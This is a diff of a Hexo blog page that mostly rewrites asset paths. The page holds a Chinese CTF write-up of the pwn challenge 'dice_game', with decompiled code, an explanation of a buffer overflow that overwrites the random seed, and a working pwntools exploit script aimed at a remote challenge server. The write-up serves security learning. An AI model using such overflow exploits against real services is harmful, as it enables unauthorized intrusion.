@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/SinkyQ/SinkyQ.github.io.git/img/fluid.png">
-  <link rel="icon" href="/SinkyQ/SinkyQ.github.io.git/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -19,7 +19,7 @@
     <meta name="description" content="0x01 Checkseclinux下checksec查壳，开启了relro nx pie防护：  0x02 分析IDA打开，主函数： 123456789101112131415161718192021222324252627282930313233343536373839__int64 __fastcall main(__int64 a1, char **a2, char **a3){  cha">
 <meta property="og:type" content="article">
 <meta property="og:title" content="攻防世界-dice_game">
-<meta property="og:url" content="https://github.com/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/index.html">
+<meta property="og:url" content="https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-dice_game/index.html">
 <meta property="og:site_name" content="Sinky&#39;s Blog">
 <meta property="og:description" content="0x01 Checkseclinux下checksec查壳，开启了relro nx pie防护：  0x02 分析IDA打开，主函数： 123456789101112131415161718192021222324252627282930313233343536373839__int64 __fastcall main(__int64 a1, char **a2, char **a3){  cha">
 <meta property="og:locale" content="en_US">
@@ -58,12 +58,12 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
 
 
-<link  rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/main.css" />
+<link  rel="stylesheet" href="/css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
   
 
 
@@ -72,22 +72,22 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"github.com","root":"/SinkyQ/SinkyQ.github.io.git/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/SinkyQ/SinkyQ.github.io.git/local-search.xml"};
+    var CONFIG = {"hostname":"sinky.top","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/SinkyQ/SinkyQ.github.io.git/js/utils.js" ></script>
-  <script  src="/SinkyQ/SinkyQ.github.io.git/js/color-schema.js" ></script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
   
 
 
   
-<meta name="generator" content="Hexo 6.2.0">
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Sinky's Blog" type="application/atom+xml">
+
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-<link rel="alternate" href="/SinkyQ/SinkyQ.github.io.git/atom.xml" title="Sinky's Blog" type="application/atom+xml">
 </head>
 
 
@@ -100,7 +100,7 @@
 <div class="header-inner" style="height: 70vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/SinkyQ/SinkyQ.github.io.git/">
+    <a class="navbar-brand" href="/">
       <strong>Sinky</strong>
     </a>
 
@@ -119,7 +119,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/">
+              <a class="nav-link" href="/">
                 <i class="iconfont icon-home-fill"></i>
                 Home
               </a>
@@ -131,7 +131,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/archives/">
+              <a class="nav-link" href="/archives/">
                 <i class="iconfont icon-archive-fill"></i>
                 Archives
               </a>
@@ -143,7 +143,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/categories/">
+              <a class="nav-link" href="/categories/">
                 <i class="iconfont icon-category-fill"></i>
                 Categories
               </a>
@@ -155,7 +155,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/tags/">
+              <a class="nav-link" href="/tags/">
                 <i class="iconfont icon-tags-fill"></i>
                 Tags
               </a>
@@ -167,7 +167,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/SinkyQ/SinkyQ.github.io.git/about/">
+              <a class="nav-link" href="/about/">
                 <i class="iconfont icon-user-fill"></i>
                 About
               </a>
@@ -196,7 +196,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/SinkyQ/SinkyQ.github.io.git/img/default.png') no-repeat center center; background-size: cover;">
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
@@ -280,14 +280,14 @@
               <div class="markdown-body">
                 
                 <h2 id="0x01-Checksec"><a href="#0x01-Checksec" class="headerlink" title="0x01 Checksec"></a>0x01 Checksec</h2><p>linux下checksec查壳，开启了relro nx pie防护：</p>
-<p><img src="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="pwn-checksec.PNG"></p>
+<p><img src="https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png" srcset="/img/loading.gif" lazyload alt="pwn-checksec.PNG"></p>
 <h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>IDA打开，主函数：</p>
 <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">55</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [rsp+37h] [rbp-19h]</span><br>  <span class="hljs-type">ssize_t</span> v6; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seed[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [rsp+4Ch] [rbp-4h]</span><br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>uLL);<br>  *(_QWORD *)seed = <span class="hljs-built_in">time</span>(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Welcome, let me know your name: "</span>, a2);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  v6 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x50</span>uLL);<br>  <span class="hljs-keyword">if</span> ( v6 &lt;= <span class="hljs-number">49</span> )<br>    buf[v6 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Hi, %s. Let's play a game.\n"</span>, buf);<br>  <span class="hljs-built_in">fflush</span>(stdout);<br>  <span class="hljs-built_in">srand</span>(seed[<span class="hljs-number">0</span>]);<br>  v8 = <span class="hljs-number">1</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Game %d/50\n"</span>, v8);<br>    v5 = <span class="hljs-built_in">sub_A20</span>();<br>    <span class="hljs-built_in">fflush</span>(stdout);<br>    <span class="hljs-keyword">if</span> ( v5 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( v5 )<br>    {<br>      <span class="hljs-keyword">if</span> ( v8 == <span class="hljs-number">50</span> )<br>      {<br>        <span class="hljs-built_in">sub_B28</span>(buf);<br>        <span class="hljs-keyword">break</span>;<br>      }<br>      ++v8;<br>    }<br>  }<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Bye bye!"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>
 
 <p>是一个srand函数程序，输入与随机出来的数匹配，则将进入flag的函数。</p>
 <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">sub_B28</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [rsp+10h] [rbp-70h]</span><br>  FILE *stream; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Congrats %s\n"</span>, a1);<br>  stream = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">"flag"</span>, <span class="hljs-string">"r"</span>);<br>  <span class="hljs-built_in">fgets</span>(&amp;s, <span class="hljs-number">100</span>, stream);<br>  <span class="hljs-built_in">puts</span>(&amp;s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">fflush</span>(stdout);<br>}<br></code></pre></td></tr></tbody></table></figure>
 <p>在输入name时，令输入数据覆盖srand函数内部随机种子，就可以控制随机数的生成。</p>
-<p><img src="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png" srcset="/SinkyQ/SinkyQ.github.io.git/img/loading.gif" lazyload alt="相差40.PNG"></p>
+<p><img src="https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png" srcset="/img/loading.gif" lazyload alt="相差40.PNG"></p>
 <p>随机树种子地址与输入名字的buf地址之间相差0x40,所以将seed覆盖掉</p>
 <h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> ctypes import *<br><span class="hljs-attribute">p</span>=remote('220.249.52.133',34691)<br><span class="hljs-attribute">libc</span>=cdll.LoadLibrary("libc.so.6")<br>p.recv()<br><span class="hljs-attribute">payload</span>=0x40*'a'+p64(0)<br>p.sendline(payload)<br>a=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(50):<br>    a.append(libc.rand()%6+1)<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    p.recv()<br>    <span class="hljs-built_in">print</span>(p.recv())<br>    p.sendline(str(i))<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>
                 
@@ -301,7 +301,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/">#pwn</a>
+        <a href="/tags/pwn/">#pwn</a>
       
     </div>
   
@@ -314,7 +314,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>攻防世界-dice_game</div>
-      <div>https://github.com/SinkyQ/SinkyQ.github.io.git/2022/08/09/攻防世界-pwn-dice_game/</div>
+      <div>https://sinky.top/2022/08/09/攻防世界-pwn-dice_game/</div>
     </div>
     <div class="license-meta">
       
@@ -356,7 +356,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" title="有关XSS跨站脚本">
+                      <a href="/2022/08/09/%E6%9C%89%E5%85%B3XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" title="有关XSS跨站脚本">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">有关XSS跨站脚本</span>
                         <span class="visible-mobile">Previous</span>
@@ -366,7 +366,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/" title="攻防世界 string">
+                      <a href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/" title="攻防世界 string">
                         <span class="hidden-mobile">攻防世界 string</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -493,8 +493,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/SinkyQ/SinkyQ.github.io.git/js/events.js" ></script>
-<script  src="/SinkyQ/SinkyQ.github.io.git/js/plugins.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -516,7 +516,7 @@
 
 
   
-    <script  src="/SinkyQ/SinkyQ.github.io.git/js/img-lazyload.js" ></script>
+    <script  src="/js/img-lazyload.js" ></script>
   
 
 
@@ -588,7 +588,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/SinkyQ/SinkyQ.github.io.git/js/local-search.js" ></script>
+  <script  src="/js/local-search.js" ></script>
 
 
 
@@ -596,7 +596,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/SinkyQ/SinkyQ.github.io.git/js/boot.js" ></script>
+<script  src="/js/boot.js" ></script>
 
 
   
